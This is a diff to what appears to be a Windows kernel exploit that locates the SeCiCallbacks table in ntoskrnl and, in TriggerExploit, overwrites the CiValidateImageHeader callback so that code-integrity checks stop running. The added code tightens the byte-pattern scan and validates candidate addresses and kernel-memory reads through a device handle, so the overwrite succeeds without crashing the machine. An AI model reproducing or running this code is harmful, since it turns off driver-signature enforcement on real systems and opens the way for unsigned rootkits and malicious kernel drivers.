@@ -307,14 +307,44 @@ static DWORD64 heuristicLeaScan(DWORD64 base, DWORD imageSize)
 			if (target & 0x7)
 				continue;
 
-			// Heuristic: next instruction should be call (E8/FF) or mov/lea (48/4C/41/44/45/89/8B/33)
-			// typical of the SepInitializeCodeIntegrity -> CiInitialize call sequence
+			// Strict heuristic: only accept if followed by a direct CALL (E8 rel32)
+			// or indirect CALL (FF 15 disp32). Other instruction bytes like 0x48, 0x4C etc.
+			// are far too common and cause false positives that lead to BSOD.
 			unsigned char nextByte = *(unsigned char*)(leaAddr + 7);
-			if (nextByte == 0xE8 || nextByte == 0xFF || nextByte == 0x48 ||
-				nextByte == 0x4C || nextByte == 0x41 || nextByte == 0x44 ||
-				nextByte == 0x45 || nextByte == 0x89 || nextByte == 0x8B ||
-				nextByte == 0x33)
-				return leaAddr;
+			if (nextByte != 0xE8)
+			{
+				// Check for FF 15 (call [rip+disp32]) as second option
+				if (nextByte == 0xFF && (i + 9 <= secSize))
+				{
+					unsigned char nextByte2 = *(unsigned char*)(leaAddr + 8);
+					if (nextByte2 != 0x15)
+						continue;
+				}
+				else
+					continue;
+			}
+
+			// Additional validation: in the usermode copy, SeCiCallbacks should be
+			// uninitialized (all zeros) since callbacks are only set at runtime by kernel.
+			// This catches false positives pointing to other data structures.
+			bool targetZeroed = true;
+			for (int k = 0; k < 6; k++)
+			{
+				if (target + (k + 1) * 8 > base + imageSize)
+				{
+					targetZeroed = false;
+					break;
+				}
+				if (*(DWORD64*)(target + k * 8) != 0)
+				{
+					targetZeroed = false;
+					break;
+				}
+			}
+			if (!targetZeroed)
+				continue;
+
+			return leaAddr;
 		}
 	}
 	return 0;
@@ -390,9 +420,53 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	DWORD64 seCiCallbacksAddr = resolveLeaTarget(seCiCallbacksInstr);
 	Printf(L"[*] Usermode SeCiCallbacks: %p\n", seCiCallbacksAddr);
 
+	// Validate: resolved address must be within the mapped module
+	if (seCiCallbacksAddr < uNtAddr || seCiCallbacksAddr + 0x30 > uNtAddr + modinfo.SizeOfImage)
+	{
+		Printf(L"[!] Resolved SeCiCallbacks address %p is outside ntoskrnl image [%p - %p]. Aborting.\n",
+			seCiCallbacksAddr, uNtAddr, uNtAddr + modinfo.SizeOfImage);
+		FreeLibrary(uNt);
+		return seCiCallbacks_swap{ 0, 0 };
+	}
+
+	// Validate: in the usermode copy, SeCiCallbacks should be uninitialized (all zeros)
+	// because the callback table is only populated at runtime by the kernel.
+	// If we find non-zero data, our pattern match is a false positive.
+	{
+		bool hasNonZero = false;
+		for (int i = 0; i < 6; i++)
+		{
+			DWORD64 val = *(DWORD64*)(seCiCallbacksAddr + i * 8);
+			if (val != 0)
+			{
+				hasNonZero = true;
+				break;
+			}
+		}
+		if (hasNonZero)
+		{
+			Printf(L"[!] Usermode SeCiCallbacks area contains non-zero data - likely false positive!\n");
+			Printf(L"[!] Data at candidate address:\n");
+			for (int i = 0; i < 6; i++)
+				Printf(L"     [+0x%02X] %016llX\n", i * 8, *(DWORD64*)(seCiCallbacksAddr + i * 8));
+			FreeLibrary(uNt);
+			return seCiCallbacks_swap{ 0, 0 };
+		}
+	}
+
 	// Calc offset from base and apply to kernel base
 	DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
 	Printf(L"[*] Offset from base     : %p\n", KernelOffset);
+
+	// Validate: offset must be within the module size
+	if (KernelOffset >= modinfo.SizeOfImage || KernelOffset + 0x30 > modinfo.SizeOfImage)
+	{
+		Printf(L"[!] SeCiCallbacks offset 0x%llX exceeds ntoskrnl size 0x%X. Aborting.\n",
+			KernelOffset, modinfo.SizeOfImage);
+		FreeLibrary(uNt);
+		return seCiCallbacks_swap{ 0, 0 };
+	}
+
 	DWORD64 kernelAddress = kModuleBase + KernelOffset;
 	Printf(L"[*] Kernel SeCiCallbacks : %p\n", kernelAddress);
 
@@ -673,8 +747,97 @@ TriggerExploit(
 	if (originalCallback == 0 || (originalCallback >> 48) == 0)
 	{
 		Printf(L"[!] Original callback looks invalid (not a kernel pointer). Aborting.\n");
+		Printf(L"[!] Value read: %016llX - this likely means the pattern scan found a false positive.\n", originalCallback);
 		Status = STATUS_UNSUCCESSFUL;
 		goto Cleanup;
+	}
+
+	// Deep validation: read the entire SeCiCallbacks struct and verify it's a callback table.
+	// SeCiCallbacks contains multiple function pointers to CI.dll functions.
+	// If we're pointing at the wrong address, entries won't look like kernel function pointers.
+	{
+		DWORD64 seCiCallbacksBase = w.ciValidateImageHeaderEntry - 0x20;
+		DWORD64 entries[6] = {0};
+		int validKernelPtrs = 0;
+		int zeroEntries = 0;
+
+		Printf(L"[*] Validating SeCiCallbacks struct at %p:\n", seCiCallbacksBase);
+		for (int i = 0; i < 6; i++)
+		{
+			NTSTATUS readSt = ReadKernelQword(DeviceHandle, seCiCallbacksBase + i * 8, &entries[i]);
+			if (!NT_SUCCESS(readSt))
+			{
+				Printf(L"[!] Failed to read SeCiCallbacks[%d]: %08X\n", i, readSt);
+				Status = readSt;
+				goto Cleanup;
+			}
+			Printf(L"     [+0x%02X] %016llX", i * 8, entries[i]);
+			if (entries[i] == 0)
+			{
+				Printf(L" (zero)\n");
+				zeroEntries++;
+			}
+			else if (entries[i] > 0xFFFF000000000000ULL)
+			{
+				Printf(L" (kernel ptr)\n");
+				validKernelPtrs++;
+			}
+			else
+			{
+				Printf(L" (NOT a kernel ptr!)\n");
+			}
+		}
+
+		// A valid SeCiCallbacks table should have at least 2 non-zero kernel function pointers
+		if (validKernelPtrs < 2)
+		{
+			Printf(L"[!] Only %d valid kernel pointers found in struct (expected >= 2).\n", validKernelPtrs);
+			Printf(L"[!] This is NOT a valid SeCiCallbacks table. Aborting to prevent BSOD.\n");
+			Status = STATUS_UNSUCCESSFUL;
+			goto Cleanup;
+		}
+
+		// All non-zero entries must be kernel pointers (no mixed data)
+		if (validKernelPtrs + zeroEntries < 6)
+		{
+			int badEntries = 6 - validKernelPtrs - zeroEntries;
+			Printf(L"[!] %d entries are neither zero nor kernel pointers.\n", badEntries);
+			Printf(L"[!] This is NOT a valid callback table. Aborting to prevent BSOD.\n");
+			Status = STATUS_UNSUCCESSFUL;
+			goto Cleanup;
+		}
+
+		Printf(L"[*] Struct validation passed: %d kernel ptrs, %d zeros\n", validKernelPtrs, zeroEntries);
+
+		// Cross-reference: SeCiCallbacks entries should point into CI.dll
+		// Look up CI.dll kernel module and verify at least some entries are within its range
+		ULONG_PTR ciBase = GetKernelModuleAddress("CI.dll");
+		if (ciBase == 0)
+			ciBase = GetKernelModuleAddress("ci.dll");
+		if (ciBase != 0)
+		{
+			Printf(L"[*] CI.dll kernel base: %p\n", ciBase);
+			int ciHits = 0;
+			// CI.dll is typically < 1MB; use generous 4MB range
+			DWORD64 ciEnd = ciBase + 0x400000;
+			for (int i = 0; i < 6; i++)
+			{
+				if (entries[i] != 0 && entries[i] >= ciBase && entries[i] < ciEnd)
+					ciHits++;
+			}
+			if (ciHits == 0)
+			{
+				Printf(L"[!] WARNING: No callback entries point into CI.dll range [%p - %p]\n", ciBase, ciEnd);
+				Printf(L"[!] This strongly suggests a false positive. Aborting to prevent BSOD.\n");
+				Status = STATUS_UNSUCCESSFUL;
+				goto Cleanup;
+			}
+			Printf(L"[*] CI.dll cross-reference: %d/%d entries in CI.dll range\n", ciHits, validKernelPtrs);
+		}
+		else
+		{
+			Printf(L"[*] Could not find CI.dll module (non-fatal, skipping cross-reference check)\n");
+		}
 	}
 
 	// Overwrite CiValidateImageHeader with ZwFlushInstructionCache (harmless stub)
